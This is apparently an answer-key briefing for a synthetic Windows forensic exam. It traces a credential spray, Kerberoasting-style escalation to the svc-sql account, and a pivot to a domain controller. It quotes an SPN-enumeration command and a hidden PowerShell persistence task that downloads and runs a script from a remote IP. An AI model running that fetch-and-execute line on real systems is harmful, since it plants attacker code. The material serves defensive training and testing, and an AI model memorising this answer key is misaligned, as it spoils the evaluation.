# Briefing: credential-spray-domain-compromise

Human-readable ground truth. Do not share with the agent-under-test.

## Provenance

Synthetic data, generated with EvidenceForge v1.17.0, commit
`567073b0ac0a1d7944ea4695e9bde4a305dcebb9`, seed `8213`. Scenario
source:
`forensic-agent-answers/generators/evidenceforge/credential-spray-domain-compromise/scenario.yaml`.
Sourced from `doc/TEST_EVIDENCEFORGE_PROPOSED_CASES.md` proposal #1.

**Every fact below was independently verified directly against the
rendered XML data** before being written down, not assumed from the
scenario design. `GROUND_TRUTH.md` was separately checked and found
accurate for this scenario (unlike `external-recon-no-breach`) — still
verified directly, per this project's standing rule not to trust it
without checking.

## The story, stage by stage

All timestamps UTC.

### Stage 1 — Credential spray (`DC-01`)
**2024-09-09T15:05:42Z – 15:09:42Z** — Three failed logon attempts
(Event ID 4625, Logon Type 3), all from `::ffff:185.220.101.44`, against
`mark.chen` (15:05:42), `elena.popov` (15:07:00), and `diane.foster`
(15:09:42), roughly 80-90 seconds apart — a classic low-and-slow spray
pattern.

### Stage 2 — Compromise (`WS-DFOSTER-01`)
**2024-09-09T15:15:52Z** — A *distinct* successful logon (Event ID
4624, Logon Type 3, `TargetLogonId: 0xe8a8fcd`) for `diane.foster` from
the same source, `::ffff:185.220.101.44`, about 6 minutes after her
failed spray attempt. This is the actual compromise — a separate event
from the spray's failures, not a flag on one of the 4625s.

### Stage 3 — Reconnaissance (`WS-DFOSTER-01`)
**2024-09-09T15:21:48Z** — Event ID 4688, `diane.foster`, PowerShell
process enumerating SPN-bearing accounts:
`powershell.exe -NoProfile -Command Get-ADUser -Filter
{ServicePrincipalName -ne "$null"} -Properties
ServicePrincipalName,MemberOf`

### Stage 4 — The Kerberoasting-consistent credential request (`WS-DFOSTER-01`)
**2024-09-09T15:26:35Z** — Event ID 4648 (explicit credential usage),
`SubjectUserName: diane.foster`, `SubjectLogonId: 0xe8a8fcd` (matching
Stage 2's logon), `ProcessName:
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`,
`TargetUserName: svc-sql`, `TargetServerName: DC-01`,
`IpAddress: 10.55.10.21` (WS-DFOSTER-01's own IP).

**This is not the only 4648 event targeting `svc-sql` in this data —
this is the important part of the case.** `svc-sql`'s credentials are
used routinely and legitimately throughout the entire ~30-hour window by
two automated processes, both attributed to `SYSTEM`:
`C:\Windows\System32\taskhostw.exe` and
`C:\Program Files\Meridian\OpsAgent\ops-agent.exe` (see
`data/ENVIRONMENT.md` — this is documented, expected background
behavior). The Stage 4 event is the **only** one with
`SubjectUserName: diane.foster` and a PowerShell process — that's the
distinguishing signal, not event rarity. An AUT that just counts "how
many 4648 events exist" without checking who/what is behind each one
will not find the right answer to Q2.

### Stage 5 — The gap (offline cracking)
No `svc-sql` activity of any kind occurs between Stage 4
(`15:26:35` on 9/9) and Stage 6 below (the local logon at `10:40:02` on
9/10, the earlier of the two-step chain) — a gap of **19 hours, 13
minutes, 27 seconds** (~19h13m either way you measure it — using the
DC-01 RDP logon instead gives 19h13m31s, an immaterial difference). This
is the distinguishing signal that separates a Kerberoasting-consistent
pattern from an ordinary same-session privilege use: a real admin action
using `svc-sql` interactively would show the credential-request and the
actual logon close together in time; a multi-hour gap with no interim
activity is consistent with the ticket being taken offline and cracked
before use.

### Stage 6 — Domain compromise (`WS-DFOSTER-01` then `DC-01`)
**Two-step chain, found by independent audit and confirmed directly
against the raw data — `grading_schema.md` was updated to accept either
step, see below:**

**2024-09-10T10:40:02.48Z** — Event ID 4624, **Logon Type 2** (local
interactive), account `svc-sql`, on `WS-DFOSTER-01` itself
(`IpAddress` field blank, as is normal for a local logon —
`TargetLogonId: 0xf1c2152`). This is the attacker switching to the
cracked `svc-sql` credential locally, on the already-compromised
workstation, immediately before pivoting.

**2024-09-10T10:40:06.09Z** — 3.6 seconds later, Event ID 4624,
**Logon Type 10** (RemoteInteractive), account `svc-sql`, on `DC-01`,
source `::ffff:10.55.10.21` — **`WS-DFOSTER-01`'s own IP**, not an
external address (`TargetLogonId: 0xe94ae48`). This is the RDP session
landing on the DC, launched from the local `svc-sql` session above.

Either event is a completely valid answer to "the next time `svc-sql`
logs on anywhere in this data" (Q3) — the local logon is technically
first, chronologically. Both point to the same conclusion: the attacker
pivoted from the already-compromised workstation directly to the DC
using the cracked `svc-sql` credential, rather than re-authenticating
externally. `svc-sql` is a Domain Admins member (see
`data/ENVIRONMENT.md`'s "known standing issue"), so this logon
constitutes full domain compromise.

### Stage 7 — Persistence (`DC-01`)
**2024-09-10T10:48:19Z** — Event ID 4698 (scheduled task created),
subject `svc-sql`, `TaskName: WindowsDefenderUpdateCheck` (a
deliberately innocuous-looking name), with an action running:
`powershell.exe -WindowStyle Hidden -Command IEX (New-Object
Net.WebClient).DownloadString('http://45.83.221.30/upd.ps1')`

## The core distinction the exam tests (Q6)

**How the attacker got in: `diane.foster`** (a compromised employee
account with no elevated privileges of her own).
**What the attacker ultimately compromised: `svc-sql`** (a Domain
Admins-equivalent service account) — this is where lasting persistence
actually lives. `diane.foster`'s own account is never used for anything
after Stage 4; all subsequent attacker activity happens as `svc-sql`.
An answer that describes this as "diane.foster compromised the domain"
or that treats the two accounts as interchangeable has missed the
central point of the case.

## Known generator-tooling notes

No generator bug — this scenario generated cleanly on the first
attempt, and `GROUND_TRUTH.md`'s claims were independently confirmed
accurate (unlike `external-recon-no-breach`). **There was, however, a
real gap in this answer key's first draft**: the engine's own
`rdp_session` bundle auto-generates a local source-side logon
immediately before the RDP transport (see Stage 6 above), and the first
version of this document only documented the DC-01 RDP logon, not the
`WS-DFOSTER-01` local logon 3.6 seconds earlier — found by an
independent Phase 6 audit, verified directly against the raw XML, and
fixed in `BRIEFING.md`/`grading_schema.md` (v1.1). Worth knowing for
future scenarios: any `rdp_session`/`ssh_session` event will produce
this kind of two-step source-side-then-target-side logon pair, and an
answer key should account for both ends, not just the one on the
system named in the storyline event.

## Undetermined by design

- **The exact tool used for the Kerberoast/ticket-cracking.** Not
  evidenced, not needed — the data supports the pattern (recon →
  explicit-credential request → multi-hour gap → use), not a specific
  tool attribution.
